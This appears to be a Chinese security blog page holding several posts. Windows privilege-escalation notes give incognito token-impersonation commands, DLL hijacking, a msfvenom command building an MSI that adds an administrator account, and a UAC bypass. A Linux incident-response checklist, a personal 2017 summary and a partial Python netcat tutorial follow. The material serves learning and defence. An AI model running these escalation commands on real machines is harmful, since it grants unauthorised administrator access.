+<h2 id="令牌提权"><a href="#令牌提权" class="headerlink" title="令牌提权"></a>令牌提权</h2><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/" target="_blank" rel="external">渗透技巧-Token窃取与利用</a></p>
+<p>首先关于令牌的概述如下</p>
+<ul>
+<li>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录</li>
+<li>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</li>
+</ul>
+<p>通过incognito这个工具，可以实现token的列举以及盗窃<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">incognito<span class="selector-class">.exe</span> list_tokens -u</div></pre></td></tr></table></figure></p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">incognito.exe<span class="built_in"> execute </span>-c <span class="string">"hacker/administrator"</span> cmd.exe</div></pre></td></tr></table></figure>
+<p>在实际利用的过程中，会通过窃取令牌创建进程，以下为incognito的具体调用<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">create_process(token_list[i].<span class="keyword">token</span>, <span class="keyword">command</span>, <span class="title">console_mode</span>, <span class="title">SecurityDelegation</span>);</div></pre></td></tr></table></figure></p>
+<h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><p><a href="https://www.freebuf.com/articles/78807.html" target="_blank" rel="external">DLL劫持科普</a></p>
+<p><a href="https://3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95/" target="_blank" rel="external">DLL劫持漏洞自动化识别工具Rattler测试</a></p>
+<p>DLL劫持的核心原理在于DLL路径搜索，调用<code>LoadLibary</code>会从以下目录搜索DLL文件<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span>程序所在目录。</div><div class="line"><span class="number">2.</span>加载 DLL 时所在的当前目录。</div><div class="line"><span class="number">3.</span>系统目录即 SYSTEM32 目录。</div><div class="line"><span class="number">4.16</span>位系统目录即 SYSTEM 目录。</div><div class="line"><span class="number">5.</span>Windows目录。</div><div class="line"><span class="number">6.</span>PATH环境变量中列出的目录</div></pre></td></tr></table></figure></p>
+<p>比如<code>a.exe</code>加载了系统的<code>kernel32.dll</code>，如果在<code>a.exe</code>同级目录下生成恶意的<code>kernel32.dll</code>即可造成恶意利用，然而由于<code>kernel32.dll</code>在注册表<code>KnownDlls</code>中，无法利用</p>
+<blockquote>
+<p>微软为了更进一步的防御系统的DLL被劫持，将一些容易被劫持的系统DLL写进了一个注册表项中，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用</p>
+</blockquote>
+<h2 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h2><p>AlwaysInstallElevated是注册表配置<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[HKEY_CURRENT_USER<span class="symbol">\S</span>OFTWARE<span class="symbol">\P</span>olicies<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\I</span>nstaller]</div><div class="line">“AlwaysInstallElevated”=dword:00000001 </div><div class="line"></div><div class="line">[HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\P</span>olicies<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\I</span>nstaller]</div><div class="line">“AlwaysInstallElevated”=dword:00000001</div></pre></td></tr></table></figure></p>
+<p>设置或开启该注册表后，允许普通用户以system权限安装msi，通过msf生成恶意msi</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">msfvenom -p windows/adduser <span class="attr">USER=superadmin</span> <span class="attr">PASS=supersuper</span> -f msi -o supper.msi</div></pre></td></tr></table></figure>
+<p>通过在普通用户下执行该msi，可生成Administrator权限用户<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">msiexec <span class="regexp">/quiet /qn /i</span> <span class="keyword">super</span>.msi</div></pre></td></tr></table></figure></p>
+<p>在实际利用过程中，该注册表项默认为0或不存在，因此较为鸡肋</p>
+<h2 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h2><blockquote>
+<p>UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。如果我们通过某种方式劫持了通过用户UAC验证的程序，那么相应的我们的程序也就实现了提权的过程。</p>
+</blockquote>
+<p>首先安装对应版本的<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank" rel="external">ProcessMonitor</a><br>运行ProcessMonitor，打开某需要UAC认证的程序，通过filter过滤出进程的DLL文件访问情况</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Process <span class="keyword">Name</span> <span class="keyword">is</span> install.exe</div></pre></td></tr></table></figure>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Path <span class="keyword">contains</span> localdir</div></pre></td></tr></table></figure>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Result <span class="keyword">is</span> <span class="keyword">NAME</span> <span class="keyword">NOT</span> FOUND</div></pre></td></tr></table></figure>
+<p>以上三个filter，可以发现程序中尝试在本地加载但是本地不存在的dll，通过在同级目录生成对应的dll文件，即可劫持。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2020/01/30/Linux应急响应排查/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D_infinite">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="D_infinite的小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/30/Linux应急响应排查/" itemprop="url">Linux应急响应排查</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-30T15:48:51+08:00">
+                2020-01-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>对于一般的Linux机器被入侵，第一要务是止损，止损的步骤如下。</p>
+<ul>
+<li>如果业务允许，最好先关停除ssh外的对外开放服务，因为往往拿到机器权限后没有办法第一时间锁定入侵源</li>
+<li>对入侵者的权限维持(反弹shell/后门…)进行查杀等操作(关键操作及时取证)</li>
+</ul>
+<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ul>
+<li>防止命令被替换，最好使用busybox进行排查，<a href="https://busybox.net/downloads/binaries/1.28.1-defconfig-multiarch/busybox-x86_64" target="_blank" rel="external">下载地址</a><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">chmod</span> +x <span class="keyword">busybox</span></div><div class="line">./<span class="keyword">busybox </span>COMMAND</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>1) 通过pstree查看正常父进程下的异常子进程<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">pstree -aup</div><div class="line">./busybox pstree -p</div><div class="line">$</div><div class="line">systemd─├─php-fpm───<span class="number">5</span>*<span class="string">[php-fpm]</span></div><div class="line">        ├─php-fpm───<span class="number">50</span>*<span class="string">[php-fpm]</span></div></pre></td></tr></table></figure></p>
+<p>如果使用ps去查询进程，没有办法清晰的查看父子进程的关系，容易有遗漏，以下是在该机器上反弹shell后pstree得到的结果。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$</div><div class="line">├─php-fpm,<span class="number">17883</span></div><div class="line">  ├─php-fpm,<span class="number">17911</span>,www</div><div class="line">  │   │   └─sh,<span class="number">11498</span> -c /bin/sh -c <span class="string">"cd "</span>/data/wwwroot/<span class="section">default</span>/dvwa<span class="string">";ping -c20 www.baidu.com;echo [S];pwd;echo [E]"</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></div><div class="line">  │   │       └─sh,<span class="number">11499</span> -c cd /data/wwwroot/<span class="section">default</span>/dvwa;ping -c20 www.baidu.com;echo [S];pwd;echo [E]</div><div class="line">  │   │           └─ping,<span class="number">11500</span> -c20 www.baidu.com</div></pre></td></tr></table></figure></p>
+<p>很清楚的看到php-fpm底下起了sh进程</p>
+<p>2) 查看进程启动时间</p>
+<p>使用ps命令列出进程时，可能由于进程较多，优先排查入侵时间附近的进程<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ps -aux</div><div class="line">$</div><div class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</div><div class="line">root         <span class="number">1</span>  <span class="number">0.0</span>  <span class="number">0.0</span> <span class="number">191000</span>  <span class="number">3932</span> ?        Ss   <span class="number">8</span>月<span class="number">06</span>  <span class="number">16</span>:<span class="number">41</span> /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">systemd</span>/<span class="title">systemd</span> --<span class="title">switched</span>-<span class="title">root</span> --<span class="title">system</span> --<span class="title">deserialize</span> 21</span></div><div class="line">root         <span class="number">2</span>  <span class="number">0.0</span>  <span class="number">0.0</span>      <span class="number">0</span>     <span class="number">0</span> ?        S    <span class="number">8</span>月<span class="number">06</span>   <span class="number">0</span>:<span class="number">00</span> [kthreadd]</div></pre></td></tr></table></figure></p>
+<p>3) 使用unhide查看隐藏进程</p>
+<p>为了尽可能的维持权限，入侵者可能会将相关后门进程隐藏，隐藏的方式有以下几种</p>
+<ul>
+<li>替换<code>top</code> <code>ps</code> 等系统命令</li>
+<li>劫持文件<code>ld.so.preload</code></li>
+<li>劫持libc库</li>
+<li>使用mount将其他目录挂载到<code>/proc/pid</code>下</li>
+<li>修改内核(rootkit)</li>
+</ul>
+<p>其中前三种可以使用unhide工具进行查杀，原因为前三种方式无法修改/proc下的文件信息，因此使用unhide调用系统函数读取proc再将读取的信息与ps做对比，即可发现隐藏进程。</p>
+<p>针对挂载的隐藏方式，使用命令<code>mount -l</code>查看是否有到<code>/proc</code>下的挂载，有的话使用<code>umount /proc/pid</code>取消挂载，查看对应进程是否恶意</p>
+<p>针对修改内核的隐藏方式，使用命令<code>lsmod</code>查看是否有加载异常模块, 但rootkit可删除<code>struct module</code>中的lsmod相关信息，从而躲避检测，具体可参考<a href="http://pwn4.fun/2017/03/16/Rootkit%E6%8A%80%E6%9C%AF%EF%BC%88%E4%BA%8C%EF%BC%89%E9%9A%90%E8%97%8FLKM/" target="_blank" rel="external">Rootkit技术（二）隐藏LKM</a></p>
+<h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p>1) 使用netstat命令检查已建立连接<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">netstat -antlp | grep EST</div><div class="line">$</div><div class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">10.207</span><span class="meta">.224</span><span class="meta">.2</span>:<span class="number">22</span>       <span class="number">172.28</span><span class="meta">.2</span><span class="meta">.1</span>:<span class="number">32971</span>    ESTABLISHED <span class="number">671</span>/sshd: admin</div><div class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">10.207</span><span class="meta">.224</span><span class="meta">.2</span>:<span class="number">19288</span>    <span class="number">10.207</span><span class="meta">.224</span><span class="meta">.3</span>:<span class="number">5555</span>     ESTABLISHED <span class="number">1896</span>/bash</div><div class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">42008</span>         <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">1234</span>          TIME_WAIT   -</div></pre></td></tr></table></figure></p>
+<p>上述命令可监控如下场景</p>
+<ul>
+<li>反弹shell(进程名为bash/sh/python/php/java/perl等等)</li>
+<li>非正常ssh登录(企业中往往使用堡垒机登录机器，而黑客则会使用获得权限的机器进行横向渗透，因此非堡垒机的ssh连接均为异常连接)</li>
+<li>即使服务监听地址是127.0.0.1，也有可能通过端口反弹等形式反弹到外网，因此需要结合进程做判断</li>
+</ul>
+<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>1) 查看SSH登录日志<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">cat</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/secure</div></pre></td></tr></table></figure></p>
+<p>登录失败的情况也需要关注，登录失败的ip可用于关联分析其他恶意行为，以及登录失败的日志也可能被用作后门，具体可参考 <a href="https://www.freebuf.com/articles/system/185942.html" target="_blank" rel="external">记一次安全应急响应中遇到的利用SSH日志触发的后门分析</a></p>
+<p>2) 查看known_hosts<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat ~<span class="regexp">/.ssh/</span>known_hosts</div></pre></td></tr></table></figure></p>
+<p>known_hosts文件会记录通过ssh,scp访问的计算机的ip以及公钥</p>
+<p>3) pam相关<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">cat</span> /etc/pam.d/sshd</div><div class="line"><span class="keyword">ll</span> /lib64/security/pam_unix.<span class="keyword">so</span></div></pre></td></tr></table></figure></p>
+<p>查看sshd的pam配置文件以及认证文件是否存在异常，具体可参考文章<a href="https://wooyun.js.org/drops/Linux%20PAM&amp;&amp;PAM%E5%90%8E%E9%97%A8.html" target="_blank" rel="external">Linux PAM&amp;&amp;PAM后门</a></p>
+<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
+<li>应用目录<ul>
+<li>Nginx: 查找nginx.conf配置文件，定位应用目录。检索目录下是否有异常文件(webshell)以及检索相应log日志是否有攻击或入侵痕迹</li>
+<li>Apache: 查找<code>apache2.conf</code>或<code>apache.conf</code>等配置文件，定位应用目录。检索目录下是否有异常文件(webshell)以及检索相应log日志是否有攻击或入侵痕迹</li>
+<li>webshell检测工具可使用长亭<a href="https://github.com/chaitin/cloudwalker" target="_blank" rel="external">牧云</a></li>
+</ul>
+</li>
+<li>/tmp</li>
+<li>/var/tmp</li>
+<li>/dev/shm</li>
+</ul>
+<h3 id="history"><a href="#history" class="headerlink" title="history"></a>history</h3><ul>
+<li>用户目录下的history(通过/etc/passwd定位用户目录，查询每个目录下的.bash_history文件)</li>
+</ul>
+<h3 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h3><ul>
+<li>inittab<ul>
+<li>inittab的启动脚本主要在<code>/etc/rc.d</code>下，配置文件则在<code>/etc/inittab</code>或<code>/etc/init/*.conf</code></li>
+</ul>
+</li>
+<li>systemd<ul>
+<li>systemd的启动脚本在<code>/lib/systemd/system</code>下，具体格式可参考<a href="https://www.jianshu.com/p/79059b06a121" target="_blank" rel="external">systemctl使用方法</a></li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2017/10/14/2017年总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D_infinite">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="D_infinite的小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/10/14/2017年总结/" itemprop="url">2017年总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-14T21:27:20+08:00">
+                2017-10-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/杂谈/" itemprop="url" rel="index">
+                    <span itemprop="name">杂谈</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>秋招终于是告一段落了，想想自己这半年来的历程，不经有些感慨。</p>
+<p>从今年三月份的时候，我开始接触安全，相比很多大一开始接触的同学，我真的可以说是非常非常晚了。所以也一再犹豫，到底该不该转做安全（因为我一开始就打算找工作了，之前学的是前端）。后来还是一横心开始学了。</p>
+<p>现在想想，自己会学安全的理由真的很简单，就是觉得ctf特别有趣，进而觉得安全特别有趣。</p>
+<p>在四五月份的时候，考虑到就业问题，如果没有实习经历会特别吃亏，所以打算找一份实习好好干干，可以说是特别幸运了，在四月中旬就有一家乙方要了我，岗位是渗透测试实习生。</p>
+<p>当然，去到之后才发现，做的其实很杂，售前也做，售后也做，包括有时候还要自己把服务器带到客户那边部署安装。虽然总的来说，这份工作不是我想象中的工作，但依然收获了很多，所以在这里特别感谢当时的同事以及上级，你们真的很可爱哈哈哈。</p>
+<p>七月份我就离职了，因为考虑到准备秋招的缘故。所以自己心里还是很愧疚的，但是权衡了一下，还是找工作重要，所以就硬着头皮跟上司讲了。这里再一次感谢boss，很爽快的就答应了。</p>
+<p>直到九月份，都在学习学习学习。基础不牢，怕地动山摇，所以疯狂吸收养分。从九月开始正式秋招。</p>
+<p>中间经历了许多的笔试和面试，终于在今天尘埃落定了，也算找到一个好的归宿。</p>
+<p>通过这次的秋招，我也对未来自己的方向有了更多的认识，需要学习的还很多，以后可有的忙了。</p>
+<p>面经我就不bilibili了，有时间再总结哈哈哈。对了对了，顺带一提，我打算做一个信息安全面试题的汇总，就放在我的<a href="https://github.com/Dollarsss/sec-interview" target="_blank" rel="external">gayhubhub</a>上面，各位有空多关注呀。</p>
+<p>就是那么多了，又要准备迎接新一段的挑战，希望自己继续跨越下一个山峰！</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2017/07/03/python编写简单netcat/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D_infinite">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="D_infinite的小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/07/03/python编写简单netcat/" itemprop="url">python编写简单netcat</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-03T16:59:02+08:00">
+                2017-07-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>之前ke推送的netcat的用法相信大家已经熟悉了，今天我来分享一下如何使用python去编写一个简单的netcat。当然了，实际使用的话，因为要依赖python环境，所以不免有点鸡肋，因此这篇文章更侧重于分享简单的python安全工具的写法。</p>
+<p>以下为要用到的python库。</p>
+<ul>
+<li>socket</li>
+<li>subprocess</li>
+<li><p>argparse</p>
+<p>同样的，本篇文章不对这些库做过多介绍，有兴趣的自行阅读官方文档。</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> argparse</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">import</span> traceback</div><div class="line"></div><div class="line"></div><div class="line">class netcat:</div><div class="line">    def __init__(<span class="built_in">self</span>):</div><div class="line">        <span class="built_in">self</span>.parser = argparse.ArgumentParser()</div><div class="line">        <span class="built_in">self</span>._init_args_parser()</div><div class="line">        <span class="built_in">self</span>.args = <span class="built_in">self</span>.parser.parse_args()</div><div class="line">        <span class="built_in">self</span>.client_socket = <span class="literal">None</span></div><div class="line">        <span class="built_in">self</span>.server_socket = <span class="literal">None</span></div><div class="line">        <span class="keyword">if</span> <span class="built_in">self</span>.args.l:</div><div class="line">            <span class="built_in">self</span>.listen_mode()</div><div class="line">        elif <span class="built_in">self</span>.args.c:</div><div class="line">            <span class="built_in">self</span>.client_mode()</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>构造一个netcat类，一些常用变量直接设置为类变量方便访问。netcat的主程序即为<strong>init</strong>()，包括初始化以及后续执行阶段。<code>client_socket</code>为服务器被连接是的socket，<code>server_socket</code>则为客户端连接时获得的socket。<code>argparse.ArgumentParser()</code>返回一个操作命令行参数的对象，调用<code>parse_args()</code>获得参数。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">def _init_args_parser(self):</div><div class="line">        self.parser.add_argument('-l', <span class="keyword">help</span>=<span class="string">'listen mode'</span>, <span class="keyword">required</span>=<span class="literal">False</span>, <span class="keyword">action</span>=<span class="string">'store_true'</span>)</div><div class="line">        self.parser.add_argument(<span class="string">'-e'</span>, <span class="keyword">help</span>=<span class="string">'execute command'</span>, <span class="keyword">required</span>=<span class="literal">False</span>, <span class="keyword">action</span>=<span class="string">'store_true'</span>)</div><div class="line">        self.parser.add_argument(<span class="string">'-a'</span>, <span class="keyword">help</span>=<span class="string">'address'</span>, <span class="keyword">required</span>=<span class="literal">False</span>, <span class="keyword">default</span>=<span class="string">'127.0.0.1'</span>)</div><div class="line">        self.parser.add_argument(<span class="string">'-p'</span>, <span class="keyword">type</span>=<span class="built_in">int</span>, <span class="keyword">help</span>=<span class="string">'port'</span>, <span class="keyword">required</span>=<span class="literal">False</span>)</div><div class="line">        self.parser.add_argument(<span class="string">'-u'</span>, <span class="keyword">help</span>=<span class="string">'upload file'</span>, <span class="keyword">required</span>=<span class="literal">False</span>)</div><div class="line">        self.parser.add_argument(<span class="string">'-c'</span>, <span class="keyword">help</span>=<span class="string">'client mode'</span>, <span class="keyword">required</span>=<span class="literal">False</span>, <span class="keyword">action</span>=<span class="string">'store_true'</span>)</div><div class="line">        self.parser.add_argument(<span class="string">'-f'</span>, <span class="keyword">help</span>=<span class="string">'select file upload'</span>, <span class="keyword">required</span>=<span class="literal">False</span>)</div></pre></td></tr></table></figure>
+<p>这是具体的参数设置，<code>-l</code>表示参数前缀，<code>help</code>指定帮助display字段，required表示字段是否必须， <code>action=&#39;store_true&#39;</code>表示只要有前缀就返回<code>True</code>。其他字段以此类推。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">listen_mode</span><span class="params">(<span class="keyword">self</span>)</span></span>:</div><div class="line">       address = <span class="keyword">self</span>.args.a</div><div class="line">       port = <span class="keyword">self</span>.args.p</div><div class="line">       <span class="keyword">if</span> <span class="keyword">not</span> port <span class="keyword">or</span> <span class="keyword">not</span> <span class="symbol">address:</span></div><div class="line">           print(<span class="string">'not port or address'</span>)</div><div class="line">       <span class="symbol">else:</span></div><div class="line">           server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">           server_socket.bind((address, port))</div><div class="line"></div><div class="line">           server_socket.listen(<span class="number">1</span>)</div><div class="line"></div><div class="line">           <span class="keyword">while</span> <span class="symbol">True:</span></div><div class="line">               client_socket, addr = server_socket.accept()</div><div class="line">               <span class="keyword">self</span>.client_socket = client_socket</div><div class="line">               <span class="keyword">self</span>.server_handler()</div></pre></td></tr></table></figure>
+<p>监听模式，首先从命令行参数当中获取地址和端口，然后通过socket进行绑定。绑定后调用<code>accept</code>建立连接。然后将<code>client_socket</code>赋予到类变量当中。后续动作则交由<code>server_handler()</code>处理。</p>
